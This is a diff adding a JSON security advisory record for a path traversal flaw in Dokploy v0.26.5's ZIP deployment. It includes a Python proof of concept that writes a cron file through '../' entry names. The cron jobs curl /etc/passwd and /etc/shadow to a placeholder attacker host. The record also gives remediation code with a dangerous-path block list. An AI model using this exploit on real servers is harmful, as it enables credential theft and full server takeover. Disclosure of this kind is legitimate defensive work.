@@ -1,0 +1,51 @@
+{
+  "global": null,
+  "id": "GHSA-66v7-g3fh-47h3",
+  "repo": {
+    "cve_id": "CVE-2026-45661",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 9.9,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-22",
+      "CWE-35"
+    ],
+    "description": "**Executive Summary**\r\n\r\nA critical path traversal vulnerability exists in Dokploy v0.26.5 that allows authenticated users to write arbitrary files to the filesystem during application deployment. When combined with Dokploy's remote server deployment feature, this vulnerability enables:\r\n\r\n- Arbitrary file write to remote server filesystems\r\n\r\n- Automatic remote code execution via cron jobs\r\n\r\n- Complete server compromise\r\n\r\n- Data exfiltration without user interaction\r\n\r\n- Persistent backdoor installation\r\n\r\n\r\nThis vulnerability bypasses all container isolation on remote server deployments.\r\n\r\n**Vulnerability Details**\r\n\r\nFile: /packages/server/src/utils/builders/drop.ts\r\n\r\nVulnerable Code (Lines 52-86):\r\n\r\n\r\n```\r\n// Line 52: User-controlled filename from ZIP entry\r\n\r\nlet filePath = entry.entryName;\r\n\r\n// Line 64: No validation against path traversal\r\n\r\nconst fullPath = path.join(outputPath, filePath).replace(/\\\\/g, \"/\");\r\n\r\n// Line 86: Direct write to filesystem\r\n\r\nawait fs.writeFile(fullPath, entry.getData());\r\n\r\n// Line 75: Remote server deployments (CRITICAL)\r\n\r\nif (sftp) {\r\n\r\n    await uploadFileToServer(sftp, entry.getData(), fullPath);\r\n\r\n}\r\n```\r\n\r\n\r\n**Root Cause Analysis:**\r\n\r\nThe application uses the `adm-zip` library (v0.5.16) to extract user-uploaded ZIP files during deployment. The code:\r\n\r\n1. Does NOT validate `entry.entryName` for path traversal sequences\r\n\r\n2. Relies on `path.join()` which normalizes but does NOT prevent traversal\r\n\r\n3. Does NOT check if the final path stays within the intended directory\r\n\r\n4. Trusts user input completely\r\n\r\n\r\n**Critical Flaw**: While local deployments have some container isolation, remote server deployments write directly to the target server's filesystem via SFTP with NO sandboxing.\r\n\r\n\r\n**CVSS 3.1 Score Calculation**\r\n\r\nBase Score: 9.8 CRITICAL\r\n\r\nCVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H\r\n\r\n\r\n**Metrics Breakdown:**\r\n\r\n- Attack Vector (AV): Network - Exploitable remotely\r\n\r\n- Attack Complexity (AC): Low - No special conditions required\r\n\r\n- Privileges Required (PR): Low - Any authenticated user account\r\n\r\n- User Interaction (UI): None - Automatic execution after deployment\r\n\r\n- Scope (S): Changed - Breaks out of intended security boundary (container/application)\r\n\r\n- Confidentiality (C): High - Full filesystem read access via exfiltration\r\n\r\n- Integrity (I): High - Arbitrary file write, code execution, system modification\r\n\r\n- Availability (A): High - Can overwrite critical system files, install ransomware\r\n\r\n\r\n**Proof of Concept**\r\n\r\n\r\nTest Environment:\r\n\r\n\r\n- Target: Dokploy v0.26.5 on AWS EC2 (Ubuntu 24.04)\r\n\r\n- Configuration: Remote server deployment via SFTP\r\n\r\n- Authentication: Valid user account with deployment permissions\r\n\r\n\r\n**Exploitation Steps:**\r\n\r\n\r\n1. Create Malicious ZIP (Python)\r\n\r\n\r\n```\r\nimport zipfile\r\n\r\nATTACKER_SERVER = \"https://attacker.ngrok-free.app/\"\r\n\r\nwith zipfile.ZipFile('exploit.zip', 'w') as zf:\r\n\r\n    # Path traversal payload\r\n\r\n    cron_payload = f'''* * * * * root /usr/bin/curl -s -X POST --data-binary @/etc/passwd {ATTACKER_SERVER}/passwd.txt\r\n\r\n* * * * * root /usr/bin/curl -s -X POST --data-binary @/etc/shadow {ATTACKER_SERVER}/shadow.txt 2>/dev/null\r\n\r\n* * * * * root /usr/bin/curl -s -X POST --data-binary @/etc/hostname {ATTACKER_SERVER}/hostname.txt\r\n\r\n* * * * * root /usr/bin/curl -s -X POST --data \"host=$(hostname)&user=$(whoami)&time=$(date)\" {ATTACKER_SERVER}/status.txt\r\n\r\n'''\r\n\r\n    \r\n\r\n    # Traversal: ../../../../../etc/cron.d/malicious-cron\r\n\r\n    zf.writestr('../../../../../etc/cron.d/malicious-cron', cron_payload)\r\n\r\n    \r\n\r\n    # Cover files (legitimate-looking)\r\n\r\n    zf.writestr('package.json', '{\"name\": \"app\", \"version\": \"1.0.0\"}')\r\n\r\n    zf.writestr('index.js', 'console.log(\"Application\");')\r\n\r\n```\r\n\r\n2. Upload via Dokploy Interface\r\n\r\n1. Navigate to target application in Dokploy UI\r\n\r\n2. Go to General -> Select \"Drop\" deployment provider\r\n\r\n3. Upload malicious ZIP file\r\n\r\n4. Click \"Deploy\"\r\n\r\n\r\n3. Automatic Exploitation\r\n\r\nTimeline:\r\n\r\n- T+0s: ZIP uploaded and extracted\r\n\r\n- T+1s: Malicious cron job written to `/etc/cron.d/malicious-cron`\r\n\r\n- T+60s: Cron daemon executes job automatically\r\n\r\n- T+61s: `/etc/passwd` exfiltrated to attacker server\r\n\r\nNo further interaction required.\r\n\r\n\r\nResult:\r\n\r\n<img width=\"1058\" height=\"1122\" alt=\"image\" src=\"https://github.com/user-attachments/assets/0b2be495-f1fc-4270-838e-5fc0578fa19f\" />\r\n\r\nFiles Successfully Written on Target Server:\r\n\r\n<img width=\"2048\" height=\"269\" alt=\"image\" src=\"https://github.com/user-attachments/assets/9ec53cce-a021-4b9b-8606-4261e5bd7c32\" />\r\n\r\n\r\nRemediation\r\n\r\nFile: /packages/server/src/utils/builders/drop.ts\r\n\r\nAdd path validation before file write operations:\r\n\r\n```\r\n// Sanitize and validate file paths\r\n\r\nlet filePath = entry.entryName.replace(/^(\\.\\.[/\\\\])+/, '');\r\n\r\nconst fullPath = path.normalize(path.join(outputPath, filePath));\r\n\r\n// Validate path stays within outputPath\r\n\r\nconst normalizedBase = path.normalize(outputPath + path.sep);\r\n\r\nif (!fullPath.startsWith(normalizedBase)) {\r\n\r\n    throw new Error(`Path traversal detected: ${entry.entryName}`);\r\n\r\n}\r\n\r\n// Reject dangerous patterns\r\n\r\nconst dangerous = [/\\.\\./, /^\\/etc\\//, /cron/, /\\.ssh/, /systemd/];\r\n\r\nif (dangerous.some(p => p.test(entry.entryName))) {\r\n\r\n    throw new Error(`Dangerous path rejected: ${entry.entryName}`);\r\n\r\n}\r\n```\r\n\r\n\r\nAdditional Recommendations\r\n\r\n1. Input Validation: Limit ZIP file size and entry count\r\n\r\n2. Sandboxing: Use chroot or container isolation for extraction\r\n\r\n3. Least Privilege: Run deployment processes with non-root users\r\n\r\n\r\nReferences\r\n\r\n1. CWE-22: Improper Limitation of a Pathname to a Restricted Directory  \r\n\r\n   https://cwe.mitre.org/data/definitions/22.html\r\n\r\n2. OWASP Path Traversal:  \r\n\r\n   https://owasp.org/www-community/attacks/Path_Traversal\r\n\r\n\r\nCredit: Chakradhar Chirumamilla (https://www.linkedin.com/in/chirumamilla-chakradhar/)\r\n",
+    "ghsa_id": "GHSA-66v7-g3fh-47h3",
+    "html_url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-66v7-g3fh-47h3",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-66v7-g3fh-47h3"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-45661"
+      }
+    ],
+    "published_at": "2026-05-11T18:35:41Z",
+    "references": [],
+    "severity": "critical",
+    "summary": "Remote Code Execution through Path Traversal",
+    "updated_at": "2026-05-13T04:42:28Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "",
+          "name": ""
+        },
+        "patched_versions": "",
+        "vulnerable_version_range": "0.26.5"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "Dokploy/dokploy"
+}
